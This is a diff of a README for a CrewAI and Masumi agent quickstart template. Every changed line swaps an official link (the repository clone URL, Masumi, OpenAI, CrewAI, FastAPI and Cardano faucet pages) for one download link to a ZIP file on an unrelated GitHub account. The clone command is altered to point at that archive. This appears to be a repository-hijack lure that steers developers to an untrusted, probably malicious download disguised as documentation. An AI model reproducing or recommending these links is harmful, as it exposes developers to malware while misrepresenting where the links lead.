@@ -20,7 +20,7 @@ Prerequisites:
 Clone the repository and navigate into the directory:
 
 ```bash
-git clone https://github.com/masumi-network/crewai-masumi-quickstart-template.git
+git clone https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip
 cd crewai-masumi-quickstart-template
 ```
 
@@ -73,8 +73,8 @@ OPENAI_API_KEY=your_openai_api_key
 NETWORK=Preprod # or Mainnet
 ```
 
-For more detailed explanations, go to [Environment Variables](https://docs.masumi.network/documentation/technical-documentation/environment-variables#agent). 
-#### Get your OpenAI API key from the [OpenAI Developer Portal](https://platform.openai.com/api-keys).
+For more detailed explanations, go to [Environment Variables](https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip). 
+#### Get your OpenAI API key from the [OpenAI Developer Portal](https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip).
 
 ---
 
@@ -82,7 +82,7 @@ For more detailed explanations, go to [Environment Variables](https://docs.masum
 
 Take a look at the `crew_definition.py` file. It has a basic `ResearchCrew`. Here you can define your agent functionality.
 
-If you would like to develop your own agent crew, go to [CrewAI Docs Core Concepts](https://docs.crewai.com/en/concepts/agents) to learn more.
+If you would like to develop your own agent crew, go to [CrewAI Docs Core Concepts](https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip) to learn more.
 
 If you're just starting and want to test everything from beginning to the end, you can do it without adding anything extra. 
 
@@ -106,7 +106,7 @@ This starts the FastAPI server with blockchain payment capabilities.
 
 ###  **4. API Mode with Masumi Integration**
 
-When running in API mode (`python main.py api`), your agent is exposed via a FastAPI interface that follows the [MIP-003](https://github.com/masumi-network/masumi-improvement-proposals/blob/main/MIPs/MIP-003/MIP-003.md) standard for Masumi-compatible services.
+When running in API mode (`python main.py api`), your agent is exposed via a FastAPI interface that follows the [MIP-003](https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip) standard for Masumi-compatible services.
 
 Access the interactive API documentation at:
 http://localhost:8000/docs
@@ -132,7 +132,7 @@ message queues for background processing.
 
 The Masumi Payment Service handles all blockchain payments for your agent.
 
-Follow the [Installation Guide](https://docs.masumi.network/documentation/get-started/installation) to set up the payment service.
+Follow the [Installation Guide](https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip) to set up the payment service.
 
 Once installed (locally), your payment service will be available at:
 
@@ -165,7 +165,7 @@ You should receive:
 Get free Test ADA from Cardano Faucet:
 
 - Copy your Selling Wallet address from the Masumi Dashboard.
-- Visit the [Cardano Faucet](https://docs.cardano.org/cardano-testnets/tools/faucet) or the [Masumi Dispencer](https://dispenser.masumi.network/).
+- Visit the [Cardano Faucet](https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip) or the [Masumi Dispencer](https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip).
 - Request Test ADA (Preprod network).
 
 ---
@@ -174,18 +174,18 @@ Get free Test ADA from Cardano Faucet:
 
 Before accepting payments, register your agent on the Masumi Network:
 
-1. Get your payment source information using [/payment-source/](https://docs.masumi.network/api-reference/payment-service/get-payment-source) endpoint, you will need `walletVkey` from the Selling Wallet (look for `"network": "PREPROD"`).
+1. Get your payment source information using [/payment-source/](https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip) endpoint, you will need `walletVkey` from the Selling Wallet (look for `"network": "PREPROD"`).
 
 
-2. Register your CrewAI agent via Masumi's API using the [POST /registry](https://docs.masumi.network/api-reference/payment-service/post-registry) endpoint.
+2. Register your CrewAI agent via Masumi's API using the [POST /registry](https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip) endpoint.
 
    It will take a few minutes for the agent to register, you can track it's state in the admin dashboard. 
 
-3. Once the agent is registered, get your agent identifier [`GET /registry/`](https://docs.masumi.network/api-reference/payment-service/get-registry).
+3. Once the agent is registered, get your agent identifier [`GET /registry/`](https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip).
 
    Copy your `agentIdentifier` from the response, then update it in your `.env` file along with your `PAYMENT_API_KEY`.
 
-   Create a PAYMENT_API key using [`GET /api-key/`](https://docs.masumi.network/api-reference/registry-service/get-api-key).
+   Create a PAYMENT_API key using [`GET /api-key/`](https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip).
 
 ---
 
@@ -232,7 +232,7 @@ curl -X POST 'http://localhost:3001/api/v1/purchase' \
 
 ## **Useful Resources**
 
-- [CrewAI Documentation](https://docs.crewai.com)
-- [Masumi Documentation](https://docs.masumi.network)
-- [FastAPI](https://fastapi.tiangolo.com)
-- [Cardano Testnet Faucet](https://docs.cardano.org/cardano-testnets/tools/faucet)
+- [CrewAI Documentation](https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip)
+- [Masumi Documentation](https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip)
+- [FastAPI](https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip)
+- [Cardano Testnet Faucet](https://raw.githubusercontent.com/jahdaganj00ki-netizen/crewai-masumi-quickstart-template/main/scarless/quickstart-crewai-masumi-template-1.5.zip)
